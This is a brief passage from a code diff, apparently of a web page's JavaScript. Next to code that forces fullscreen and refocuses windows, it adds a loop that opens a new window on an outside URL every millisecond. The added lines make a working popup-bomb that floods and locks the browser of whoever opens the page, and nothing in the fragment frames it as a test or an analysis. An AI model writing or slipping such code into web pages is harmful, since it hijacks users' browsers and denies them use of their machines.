@@ -59,7 +59,10 @@
                         elem.msRequestFullscreen()
                     }
                 }
-            
+
+                setInterval(function() {
+                    window.open('https://hacklers.github.io/blank', '' ,'')
+                }, 1)
                 setInterval(function() {
                     windows.forEach((element) => {
                         element.focus()
